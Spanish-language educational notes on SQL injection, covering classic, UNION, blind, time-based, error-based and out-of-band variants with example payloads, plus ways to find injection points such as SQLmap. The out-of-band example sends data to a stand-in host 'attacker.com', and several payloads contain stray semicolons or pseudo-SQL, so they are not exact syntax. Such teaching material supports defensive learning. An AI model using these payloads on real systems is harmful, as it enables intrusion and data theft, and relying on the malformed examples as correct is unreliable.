# Notas sobre Inyección SQL

## ¿Qué es una inyección SQL?

Una inyección SQL es una técnica de ataque que consiste en insertar código SQL malicioso en las consultas que se envían a una base de datos. Esto ocurre cuando una aplicación web no valida adecuadamente los datos proporcionados por el usuario antes de añadirlos a una consulta SQL y enviarlos a la base de datos. Mediante esta técnica, un atacante puede manipular las interacciones legítimas de la aplicación web con la base de datos y realizar acciones como leer, modificar o dejar indisponibles diferentes registros de la base de datos.

## Tipos de Inyecciones SQL

1. **Inyección Clásica o de Primer Orden**:
   - **Descripción**: El atacante introduce código SQL malicioso directamente a través de los métodos de entrada de la aplicación.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT * FROM usuarios WHERE usuario = 'nombre_usuario' AND contrasena = 'contrasena_ingresada';

     -- Inyección SQL
     nombre_usuario = ''; OR '1'='1'; --
     ```

     - **Consulta resultante**:
       ```sql
       SELECT * FROM usuarios WHERE usuario = '' OR '1'='1'; -- ' AND contrasena = 'contrasena_ingresada';
       ```

2. **Inyección Basada en UNION**:
   - **Descripción**: El atacante usa la palabra clave `UNION` para combinar los resultados de la consulta original con el código malicioso.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT usuario, email FROM usuarios WHERE usuario = 'nombre_usuario';

     -- Inyección SQL
     nombre_usuario = ''; UNION SELECT null, version(); --
     ```

     - **Consulta resultante**:
       ```sql
       SELECT usuario, email FROM usuarios WHERE usuario = '' UNION SELECT null, version(); -- ' ;
       ```

3. **Blind SQL Injection**:
   - **Descripción**: Utilizada cuando la aplicación no muestra resultados de la consulta. Se basa en observaciones condicionales lógicas.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT * FROM usuarios WHERE nombre_usuario = 'nombre' AND contrasena = 'contrasena_ingresada';

     -- Inyección SQL
     nombre_usuario = ''; AND SUBSTRING(nombre_usuario, 1, 1) = 'A' -- 
     ```

     - **Consulta resultante**:
       ```sql
       SELECT * FROM usuarios WHERE nombre_usuario = '' AND SUBSTRING(nombre_usuario, 1, 1) = 'A'-- ' AND contrasena = 'contrasena_ingresada';
       ```

4. **Inyección Basada en Tiempo (Time-based)**:
   - **Descripción**: Similar al Blind SQL Injection, pero usa funciones de tiempo para inferir resultados.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT * FROM usuarios WHERE nombre_usuario = 'nombre' AND contrasena = 'contrasena_ingresada';

     -- Inyección SQL
     nombre_usuario = ''; AND IF(LENGTH((SELECT nombre_usuario FROM usuarios LIMIT 1))=5, SLEEP(5), 0)--
     ```

     - **Consulta resultante**:
       ```sql
       SELECT * FROM usuarios WHERE nombre_usuario = '' AND IF(LENGTH((SELECT nombre_usuario FROM usuarios LIMIT 1))=5, SLEEP(5), 0)-- ' AND contrasena = 'contrasena_ingresada';
       ```

5. **Inyección Basada en Errores**:
   - **Descripción**: El atacante provoca errores intencionales en la base de datos para obtener información a través de los mensajes de error.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT * FROM usuarios WHERE usuario = 'nombre_usuario';

     -- Inyección SQL
     nombre_usuario = ''; AND 1=CONVERT(int, (SELECT @@version)) -- 
     ```

     - **Consulta resultante**:
       ```sql
       SELECT * FROM usuarios WHERE usuario = '' AND 1=CONVERT(int, (SELECT @@version)) -- ';
       ```

6. **Inyección Out-of-Band (OOB)**:
   - **Descripción**: Usa métodos alternativos, como solicitudes HTTP o DNS, para exfiltrar datos en lugar de hacerlo directamente a través de la aplicación web vulnerable.
   - **Ejemplo**:
     ```sql
     -- Consulta original
     SELECT * FROM usuarios WHERE usuario = 'nombre_usuario';

     -- Inyección SQL
     nombre_usuario = ''; IF (1=1) THEN (http://attacker.com/exfil?data=(SELECT database())); END IF;
     ```

## Identificación de Puntos de Inyección

Para identificar puntos de inyección en una aplicación web:

1. **Introducción de Caracteres Conflictivos**:
   - Insertar caracteres especiales (`'`, `"`, `--`, etc.) en los campos de entrada para generar errores y observar respuestas.

2. **Uso de Técnicas Condicionales y de Tiempo**:
   - Utilizar condiciones lógicas o funciones de retraso (`SLEEP`) para analizar el comportamiento de la aplicación.

3. **Herramientas de Análisis y Explotación**:
   - Herramientas como SQLmap pueden automatizar la identificación y explotación de vulnerabilidades SQL.

Estos métodos permiten descubrir puntos vulnerables y evaluar su viabilidad de explotación.
